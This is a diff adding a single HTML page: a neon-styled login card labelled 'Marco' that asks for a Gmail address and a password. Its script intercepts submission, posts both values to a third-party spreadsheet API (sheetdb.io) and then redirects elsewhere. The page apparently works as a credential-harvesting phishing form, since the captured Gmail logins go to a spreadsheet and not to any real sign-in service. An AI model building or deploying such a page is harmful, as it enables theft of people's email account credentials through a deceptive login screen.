@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Website Title</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #636c8a, #636c8a); /* Modern gradient background */
+            color: black;
+            transition: background-color 0.3s ease; /* Smooth transition */
+        }
+
+        body.dark-theme {
+            background: linear-gradient(135deg, #2c2c2c, #2c2c2c); /* Dark gradient for dark theme */
+            color: rgb(177, 172, 172); /* Light grey for text */
+        }
+
+        .card-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .neon-card {
+            background-color: rgba(39, 38, 38, 0.7);
+            border-radius: 10px;
+            padding: 30px 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1), 
+                        0 0 40px rgba(0, 150, 255, 0.4),
+                        0 0 60px rgba(255, 255, 255);
+            transition: all 0.3s ease-in-out;
+        }
+
+        .neon-card:hover {
+            box-shadow: 0 0 20px rgba(0, 225, 255, 1),
+                        0 0 40px rgba(0, 255, 255, 0.8),
+                        0 0 60px rgba(0, 255, 255, 0.6),
+                        0 0 80px rgba(0, 255, 255, 0.4);
+        }
+
+        .input {
+            border: none;
+            outline: none;
+            border-radius: 15px;
+            padding: 1em;
+            background-color: #ccc;
+            margin-top: 15px;
+            box-shadow: inset 2px 5px 10px rgba(0, 0, 0, 0.3);
+            transition: 300ms ease-in-out;
+        }
+
+        .input:focus {
+            background-color: white;
+            transform: scale(1.05);
+            box-shadow: 13px 13px 100px #969696,
+                        -13px -13px 100px #ffffff;
+        }
+
+        button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            color: #7e97b8;
+            background-color: #e0e8ef;
+            border: 2px solid rgba(255, 255, 255, 0.333);
+            border-radius: 40px;
+            padding: 16px 24px;
+            box-shadow: -4px -2px 16px 0px #ffffff, 
+                        4px 2px 16px 0px rgba(95, 157, 231, 0.48);
+            transition: 0.2s;
+        }
+        
+        .light-button {
+         margin-top: 30px; /* Adjust this value for spacing */
+         margin-left: auto; /* Center horizontally */
+          margin-right: auto; /* Center horizontally */
+        display: block; /* Make it a block element */
+     }
+
+
+
+
+        button:hover {
+            color: #516d91;
+            background-color: #E5EDF5;
+            box-shadow: -2px -1px 8px 0px #ffffff, 
+                        2px 1px 8px 0px rgba(95, 157, 231, 0.48);
+        }
+
+        button:active {
+            box-shadow: none;
+        }
+
+        .toggle-container {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .toggle {
+            position: relative;
+            width: 50px;
+            height: 25px;
+            background-color: #ccc;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .toggle::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            width: 19px;
+            height: 19px;
+            background-color: rgb(116, 109, 109);
+            border-radius: 50%;
+            transition: transform 0.3s;
+        }
+
+        body.dark-theme .toggle {
+            background-color: #3a3a3a;
+            color: #ffffff;
+        }
+
+        body.dark-theme .toggle:hover {
+            background-color: #505050; /* Lighter on hover */
+        }
+
+        body.dark-theme .toggle::after {
+            transform: translateX(25px);
+        }
+
+        .label {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+
+        .neon-text {
+            font-size: 48px;
+            letter-spacing: 2px; 
+            text-transform: uppercase; 
+            color: #ffffff; 
+            text-shadow:
+                0 0 8px rgba(255, 255, 255),
+                0 0 16px rgb(255, 255, 255),
+                0 0 24px rgb(255, 255, 255),
+                0 0 32px rgb(255, 255, 255),
+                0 0 64px rgb(255, 255, 255);
+            animation: neonPulse 1.5s ease-in-out infinite;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        @keyframes neonPulse {
+            0%, 100% {
+                text-shadow:
+                    0 0 8px rgb(134, 160, 247),
+                    0 0 16px rgb(161, 135, 254),
+                    0 0 24px rgb(128, 194, 244),
+                    0 0 32px rgb(152, 123, 240),
+                    0 0 64px rgb(117, 138, 244);
+            }
+            50% {
+                text-shadow:
+                    0 0 12px rgb(61, 236, 236),
+                    0 0 24px rgb(65, 90, 146),
+                    0 0 36px rgb(72, 138, 252),
+                    0 0 48px rgb(188, 85, 240),
+                    0 0 96px rgb(210, 112, 255);
+            }
+        }
+
+        .neon-text:hover {
+            transform: scale(1.05); /* Slightly enlarge on hover */
+        }
+     #loading-container
+     .wrapper {
+       width: 200px;
+       height: 60px;
+      position: relative;
+      z-index: 1;
+     display: none; /* Initially hide the loading animation */
+     }
+
+    .circle {
+      width: 20px;
+     height: 20px;
+     position: absolute;
+     border-radius: 50%;
+     background-color: #fff;
+     left: 15%;
+     transform-origin: 50%;
+     animation: circle7124 .5s alternate infinite ease;
+     }
+
+     @keyframes circle7124 {
+      0% {
+      top: 60px;
+      height: 5px;
+      border-radius: 50px 50px 25px 25px;
+      transform: scaleX(1.7);
+     }
+
+    40% {
+     height: 20px;
+     border-radius: 50%;
+     transform: scaleX(1);
+     }
+
+     100% {
+      top: 0%;
+      }
+     }
+
+     .shadow {
+     width: 20px;
+     border-radius: 50%;
+     background-color: rgba(0,0,0,0.9);
+     position: absolute;
+     top: 62px;
+     transform-origin: 50%;
+     z-index: -1;
+     left: 15%;
+     filter: blur(1px);
+     animation: shadow046 .5s alternate infinite ease;
+     }
+
+     @keyframes shadow046 {
+     0% {
+     transform: scaleX(1.5);
+     }
+
+     40% {
+       transform: scaleX(1);
+      opacity: .7;
+      }
+
+     100% {
+       transform: scaleX(.2);
+       opacity: .4;
+     }
+     }
+    </style>
+</head>
+<body class="light-theme">
+    <div class="toggle-container">
+        <div class="toggle" id="theme-toggle" aria-label="Toggle Theme"></div>
+        <div class="label">Theme</div>
+    </div>
+    
+    <div class="card-container">
+        <div class="neon-card">
+            <h1 class="neon-text">Marco</h1>
+            <form method="post" id="sheetdb-form" action="https://sheetdb.io/api/v1/9jr324q74cxjt">
+                <!-- Loading animation container (initially hidden) -->
+                <div class="wrapper" id="loading-container" style="display: none;">
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                    <div class="circle"></div>
+                    <div class="shadow"></div>
+                    <div class="shadow"></div>
+                    <div class="shadow"></div>
+                </div> 
+            
+                <!-- Input fields -->
+                <input type="text" autocomplete="off" name="data[Gmail]" class="input" placeholder="Gmail" required>
+                <input type="password" autocomplete="off" name="data[Lock]" class="input" placeholder="Lock" required>
+            
+                <!-- Login Button -->
+                <button type="submit" class="light-button" aria-label="Login to your account" id="login-button">
+                    Login
+                </button>
+            </form>            
+        </div>
+    </div>
+
+    <script>
+     var form = document.getElementById('sheetdb-form');
+     var loadingContainer = document.getElementById('loading-container'); // Loading animation container
+     var loginButton = document.getElementById('login-button'); // Login button
+
+    // Listen for the form submission
+    form.addEventListener("submit", function(e) {
+    e.preventDefault();  // Prevent the default form submission
+
+    // Step 1: Show the loading animation and hide the form
+    loadingContainer.style.display = 'block';  // Show the loading animation
+    form.style.display = 'none';  // Hide the form
+
+    // Step 2: Submit the form data via fetch API
+    fetch(form.action, {
+        method: "POST",
+        body: new FormData(form),
+    })
+    .then(response => response.json())  // Handle the response from the server
+    .then(() => {
+        // After submission is successful, redirect to the target page
+        window.location.href = 'my website eg2.html';  // Adjust the URL to your destination
+    })
+    .catch((error) => {
+        // Handle any errors during submission
+        alert("An error occurred. Please try again.");
+        loadingContainer.style.display = 'none';  // Hide loading animation if there's an error
+        form.style.display = 'block';  // Show the form again
+    });
+});
+
+        
+
+        const toggle = document.getElementById('theme-toggle');
+        const body = document.body;
+
+        toggle.addEventListener('click', () => {
+            body.classList.toggle('dark-theme');
+            body.classList.toggle('light-theme');
+
+            const isDark = body.classList.contains('dark-theme');
+            toggle.setAttribute('aria-label', isDark ? 'Switch to Light Theme' : 'Switch to Dark Theme');
+        });
+    </script>
+</body>
+</html>
